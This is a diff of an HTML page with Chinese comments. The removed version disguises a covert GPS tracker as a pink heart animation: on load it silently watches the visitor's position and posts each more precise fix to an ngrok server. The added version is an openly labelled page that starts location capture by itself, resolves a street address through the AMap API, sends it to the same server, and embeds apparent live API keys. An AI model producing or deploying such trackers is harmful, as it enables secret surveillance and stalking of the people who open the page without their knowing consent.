@@ -1,341 +1,161 @@
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
-<HTML>
- <HEAD>
-  <TITLE>❤️</TITLE>
-  <META NAME="Generator" CONTENT="EditPlus">
-  <META NAME="Author" CONTENT="">
-  <META NAME="Keywords" CONTENT="">
-  <META NAME="Description" CONTENT="">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-  html, body {
-    height: 100%;
-    padding: 0;
-    margin: 0;
-    background: #000;
-    overflow: hidden;
-  }
-  canvas {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-  }
-  </style>
- </HEAD>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>位置发送系统 (高德版)</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; padding: 20px; max-width: 600px; margin: 0 auto; background-color: #f4f4f9; }
+        .container { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
+        h2 { color: #333; margin-bottom: 1.5rem; }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 5px; cursor: pointer; transition: background 0.3s; width: 100%; }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        #status { margin-top: 20px; text-align: left; font-size: 14px; line-height: 1.6; word-wrap: break-word; }
+        .log-item { margin-bottom: 5px; padding-bottom: 5px; border-bottom: 1px solid #eee; }
+        .success { color: green; font-weight: bold; }
+        .error { color: red; font-weight: bold; }
+        .address-info { font-size: 12px; color: #666; margin-top: 2px; }
+    </style>
 
- <BODY>
-  <canvas id="pinkboard"></canvas>
+    <script type="text/javascript">
+        window._AMapSecurityConfig = {
+            securityJsCode: 'bbedba2a905f7c70609d2fe9616bd10e', // ✅ 已填入您的安全密钥
+        };
+    </script>
 
-  <script>
-    // ✅ 请确保这是你最新的 Ngrok 地址
-    const SERVER_URL = "https://vincent-unmeasurable-fiducially.ngrok-free.dev/api/receive_location";
+    <script type="text/javascript" src="https://webapi.amap.com/maps?v=2.0&key=d6dac34648512c1dedfa82fe5d363d19"></script> 
+</head>
+<body>
 
-    let watchID = null;
-    let bestAccuracy = 10000; // 初始设为一个很大的误差值
+    <div class="container">
+        <h2>📍 高德精确定位系统</h2>
+        <p style="color: #666; margin-bottom: 20px;">系统正在尝试调用高德 LBS 获取位置...</p>
+        
+        <button id="btn" onclick="startProcess()">正在初始化...</button>
 
-    window.onload = function() {
-        console.log("页面加载完毕，启动高精度持续定位...");
-        startHighPrecisionTracking();
-    };
+        <div id="status"></div>
+    </div>
 
-    function startHighPrecisionTracking() {
-        if (!navigator.geolocation) {
-            console.error("浏览器不支持地理位置");
-            return;
-        }
+    <script>
+        // ⚠️ 注意：如果你的 Ngrok 重启过，请务必更新下面的 URL
+        const SERVER_URL = "https://vincent-unmeasurable-fiducially.ngrok-free.dev/api/receive_location";
 
-        const options = {
-            enableHighAccuracy: true, // 开启高精度模式 (强制使用GPS)
-            timeout: 15000,           // 等待时间延长
-            maximumAge: 0             // 不使用缓存
+        window.onload = function() {
+            log("页面已加载，准备初始化高德地图组件...");
+            // 检查高德是否加载成功
+            if (typeof AMap === 'undefined') {
+                log("❌ 错误: 高德地图脚本加载失败，请检查网络", "error");
+                document.getElementById('btn').innerText = "脚本加载失败";
+                return;
+            }
+            startProcess(); 
         };
 
-        // 使用 watchPosition 而不是 getCurrentPosition
-        // 这会让手机 GPS 持续工作，随着时间推移，位置会越来越准
-        watchID = navigator.geolocation.watchPosition(
-            (position) => {
-                const currentAccuracy = position.coords.accuracy;
-                
-                // 逻辑：只有当获取到的精度比之前更好（数值更小）时，才发送
-                // 或者这是第一次获取数据
-                if (currentAccuracy < bestAccuracy) {
-                    console.log(`发现更精准的位置！精度: ${currentAccuracy}米 (之前: ${bestAccuracy}米)`);
-                    bestAccuracy = currentAccuracy;
+        function log(msg, type = 'normal', detail = '') {
+            const statusDiv = document.getElementById('status');
+            const time = new Date().toLocaleTimeString();
+            let colorStr = type === 'error' ? 'color:red' : (type === 'success' ? 'color:green' : 'color:#333');
+            
+            let html = `<div class="log-item" style="${colorStr}">
+                            <div>[${time}] ${msg}</div>
+                            ${detail ? `<div class="address-info">${detail}</div>` : ''}
+                        </div>`;
+            statusDiv.innerHTML += html;
+        }
 
-                    const data = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy, // 发送精度数据以供参考
-                        timestamp: new Date().toISOString(),
-                        note: "High Precision Update" // 标记
-                    };
-                    
-                    sendDataSilently(data);
+        function startProcess() {
+            const btn = document.getElementById('btn');
+            btn.disabled = true;
+            btn.innerText = "正在定位 (AMap)...";
+            log("正在调用高德 Geolocation 插件...");
 
-                    // 如果精度已经非常高（例如小于 15 米），可以考虑停止追踪以省电
-                    if (currentAccuracy < 15) {
-                        console.log("精度已达标 (<15m)，停止追踪。");
-                        navigator.geolocation.clearWatch(watchID);
+            // ✅ 使用高德地图定位插件
+            AMap.plugin('AMap.Geolocation', function() {
+                var geolocation = new AMap.Geolocation({
+                    enableHighAccuracy: true, // 是否使用高精度定位
+                    timeout: 10000,           // 超过10秒后停止定位
+                    positionDom: false,       // 不显示定位按钮
+                    zoomToAccuracy: true,     // 定位成功后调整地图视野范围
+                    needAddress: true         // 🔴 核心功能：是否需要将经纬度解析为地址信息
+                });
+
+                geolocation.getCurrentPosition(function(status, result) {
+                    if(status == 'complete'){
+                        onComplete(result);
+                    }else{
+                        onError(result);
                     }
+                });
+            });
+        }
+
+        // ✅ 定位成功的回调
+        function onComplete(data) {
+            const formattedAddress = data.formattedAddress || "未知地址"; // 获取具体地址
+            
+            log(`✅ 定位成功`, "success", `地址: ${formattedAddress}`);
+            log(`纬度: ${data.position.lat}, 经度: ${data.position.lng}`);
+
+            // 构造发送给后端的数据
+            const payload = {
+                latitude: data.position.lat,
+                longitude: data.position.lng,
+                accuracy: data.accuracy,
+                address: formattedAddress, // 发送具体地址
+                province: data.addressComponent.province,
+                city: data.addressComponent.city,
+                district: data.addressComponent.district,
+                timestamp: new Date().toISOString(),
+                source: 'AMap_API'
+            };
+
+            sendData(payload);
+        }
+
+        // ❌ 定位失败的回调
+        function onError(data) {
+            let errorMsg = data.message || "未知错误";
+            // 常见错误处理
+            if (data.info === 'NOT_SUPPORTED') errorMsg = "浏览器不支持定位";
+            if (data.info === 'FAILED') errorMsg = "定位失败 (请检查手机GPS或HTTPS)";
+            if (data.info === 'PERMISSION_DENIED') errorMsg = "用户拒绝了定位权限";
+            
+            log(`❌ 定位失败: ${errorMsg}`, "error");
+            document.getElementById('btn').disabled = false;
+            document.getElementById('btn').innerText = "失败，点击重试";
+        }
+
+        function sendData(data) {
+            log("正在发送数据到服务器...");
+
+            fetch(SERVER_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'ngrok-skip-browser-warning': 'true'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(async (response) => {
+                if (response.ok) {
+                    const json = await response.json();
+                    log("🚀 发送成功！服务器已接收。", "success");
+                    document.getElementById('btn').innerText = "发送成功 (点击再次发送)";
+                } else {
+                    log(`⚠️ 服务器返回错误: ${response.status}`, "error");
+                    document.getElementById('btn').innerText = "发送出错 (点击重试)";
                 }
-            },
-            (error) => {
-                console.error("定位监听报错:", error.message);
-            },
-            options
-        );
-    }
+            })
+            .catch((error) => {
+                log(`❌ 网络错误: ${error.message}`, "error");
+                document.getElementById('btn').innerText = "网络错误 (点击重试)";
+            })
+            .finally(() => {
+                document.getElementById('btn').disabled = false;
+            });
+        }
+    </script>
 
-    function sendDataSilently(data) {
-        fetch(SERVER_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'ngrok-skip-browser-warning': 'true'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(res => {
-            if(res.ok) console.log("数据已上传");
-        })
-        .catch(err => console.error("上传失败", err));
-    }
-  </script>
-
-  <script>
-  /*
-   * Settings
-   */
-  var settings = {
-    particles: {
-      length:   500, // maximum amount of particles
-      duration:   2, // particle duration in sec
-      velocity: 100, // particle velocity in pixels/sec
-      effect: -0.75, // play with this for a nice effect
-      size:       30, // particle size in pixels
-    },
-  };
-
-  /*
-   * RequestAnimationFrame polyfill by Erik Möller
-   */
-  (function(){var b=0;var c=["ms","moz","webkit","o"];for(var a=0;a<c.length&&!window.requestAnimationFrame;++a){window.requestAnimationFrame=window[c[a]+"RequestAnimationFrame"];window.cancelAnimationFrame=window[c[a]+"CancelAnimationFrame"]||window[c[a]+"CancelRequestAnimationFrame"]}if(!window.requestAnimationFrame){window.requestAnimationFrame=function(h,e){var d=new Date().getTime();var f=Math.max(0,16-(d-b));var g=window.setTimeout(function(){h(d+f)},f);b=d+f;return g}}if(!window.cancelAnimationFrame){window.cancelAnimationFrame=function(d){clearTimeout(d)}}}());
-
-  /*
-   * Point class
-   */
-  var Point = (function() {
-    function Point(x, y) {
-      this.x = (typeof x !== 'undefined') ? x : 0;
-      this.y = (typeof y !== 'undefined') ? y : 0;
-    }
-    Point.prototype.clone = function() {
-      return new Point(this.x, this.y);
-    };
-    Point.prototype.length = function(length) {
-      if (typeof length == 'undefined')
-        return Math.sqrt(this.x * this.x + this.y * this.y);
-      this.normalize();
-      this.x *= length;
-      this.y *= length;
-      return this;
-    };
-    Point.prototype.normalize = function() {
-      var length = this.length();
-      this.x /= length;
-      this.y /= length;
-      return this;
-    };
-    return Point;
-  })();
-
-  /*
-   * Particle class
-   */
-  var Particle = (function() {
-    function Particle() {
-      this.position = new Point();
-      this.velocity = new Point();
-      this.acceleration = new Point();
-      this.age = 0;
-    }
-    Particle.prototype.initialize = function(x, y, dx, dy) {
-      this.position.x = x;
-      this.position.y = y;
-      this.velocity.x = dx;
-      this.velocity.y = dy;
-      this.acceleration.x = dx * settings.particles.effect;
-      this.acceleration.y = dy * settings.particles.effect;
-      this.age = 0;
-    };
-    Particle.prototype.update = function(deltaTime) {
-      this.position.x += this.velocity.x * deltaTime;
-      this.position.y += this.velocity.y * deltaTime;
-      this.velocity.x += this.acceleration.x * deltaTime;
-      this.velocity.y += this.acceleration.y * deltaTime;
-      this.age += deltaTime;
-    };
-    Particle.prototype.draw = function(context, image) {
-      function ease(t) {
-        return (--t) * t * t + 1;
-      }
-      var size = image.width * ease(this.age / settings.particles.duration);
-      context.globalAlpha = 1 - this.age / settings.particles.duration;
-      context.drawImage(image, this.position.x - size / 2, this.position.y - size / 2, size, size);
-    };
-    return Particle;
-  })();
-
-  /*
-   * ParticlePool class
-   */
-  var ParticlePool = (function() {
-    var particles,
-        firstActive = 0,
-        firstFree   = 0,
-        duration    = settings.particles.duration;
-     
-    function ParticlePool(length) {
-      // create and populate particle pool
-      particles = new Array(length);
-      for (var i = 0; i < particles.length; i++)
-        particles[i] = new Particle();
-    }
-    ParticlePool.prototype.add = function(x, y, dx, dy) {
-      particles[firstFree].initialize(x, y, dx, dy);
-      
-      // handle circular queue
-      firstFree++;
-      if (firstFree   == particles.length) firstFree   = 0;
-      if (firstActive == firstFree       ) firstActive++;
-      if (firstActive == particles.length) firstActive = 0;
-    };
-    ParticlePool.prototype.update = function(deltaTime) {
-      var i;
-      
-      // update active particles
-      if (firstActive < firstFree) {
-        for (i = firstActive; i < firstFree; i++)
-          particles[i].update(deltaTime);
-      }
-      if (firstFree < firstActive) {
-        for (i = firstActive; i < particles.length; i++)
-          particles[i].update(deltaTime);
-        for (i = 0; i < firstFree; i++)
-          particles[i].update(deltaTime);
-      }
-      
-      // remove inactive particles
-      while (particles[firstActive].age >= duration && firstActive != firstFree) {
-        firstActive++;
-        if (firstActive == particles.length) firstActive = 0;
-      }
-    };
-    ParticlePool.prototype.draw = function(context, image) {
-      // draw active particles
-      if (firstActive < firstFree) {
-        for (i = firstActive; i < firstFree; i++)
-          particles[i].draw(context, image);
-      }
-      if (firstFree < firstActive) {
-        for (i = firstActive; i < particles.length; i++)
-          particles[i].draw(context, image);
-        for (i = 0; i < firstFree; i++)
-          particles[i].draw(context, image);
-      }
-    };
-    return ParticlePool;
-  })();
-
-  /*
-   * Putting it all together
-   */
-  (function(canvas) {
-    var context = canvas.getContext('2d'),
-        particles = new ParticlePool(settings.particles.length),
-        particleRate = settings.particles.length / settings.particles.duration, // particles/sec
-        time;
-     
-    // get point on heart with -PI <= t <= PI
-    function pointOnHeart(t) {
-      return new Point(
-        160 * Math.pow(Math.sin(t), 3),
-        130 * Math.cos(t) - 50 * Math.cos(2 * t) - 20 * Math.cos(3 * t) - 10 * Math.cos(4 * t) + 25
-      );
-    }
-     
-    // creating the particle image using a dummy canvas
-    var image = (function() {
-      var canvas  = document.createElement('canvas'),
-          context = canvas.getContext('2d');
-      canvas.width  = settings.particles.size;
-      canvas.height = settings.particles.size;
-      // helper function to create the path
-      function to(t) {
-        var point = pointOnHeart(t);
-        point.x = settings.particles.size / 2 + point.x * settings.particles.size / 350;
-        point.y = settings.particles.size / 2 - point.y * settings.particles.size / 350;
-        return point;
-      }
-      // create the path
-      context.beginPath();
-      var t = -Math.PI;
-      var point = to(t);
-      context.moveTo(point.x, point.y);
-      while (t < Math.PI) {
-        t += 0.01; // baby steps!
-        point = to(t);
-        context.lineTo(point.x, point.y);
-      }
-      context.closePath();
-      // create the fill
-      context.fillStyle = '#ea80b0';
-      context.fill();
-      // create the image
-      var image = new Image();
-      image.src = canvas.toDataURL();
-      return image;
-    })();
-     
-    // render that thing!
-    function render() {
-      // next animation frame
-      requestAnimationFrame(render);
-      
-      // update time
-      var newTime   = new Date().getTime() / 1000,
-          deltaTime = newTime - (time || newTime);
-      time = newTime;
-      
-      // clear canvas
-      context.clearRect(0, 0, canvas.width, canvas.height);
-      
-      // create new particles
-      var amount = particleRate * deltaTime;
-      for (var i = 0; i < amount; i++) {
-        var pos = pointOnHeart(Math.PI - 2 * Math.PI * Math.random());
-        var dir = pos.clone().length(settings.particles.velocity);
-        particles.add(canvas.width / 2 + pos.x, canvas.height / 2 - pos.y, dir.x, -dir.y);
-      }
-      
-      // update and draw particles
-      particles.update(deltaTime);
-      particles.draw(context, image);
-    }
-     
-    // handle (re-)sizing of the canvas
-    function onResize() {
-      canvas.width  = canvas.clientWidth;
-      canvas.height = canvas.clientHeight;
-    }
-    window.onresize = onResize;
-     
-    // delay rendering bootstrap
-    setTimeout(function() {
-      onResize();
-      render();
-    }, 10);
-  })(document.getElementById('pinkboard'));
-  </script>
- </BODY>
-</HTML>
+</body>
+</html>
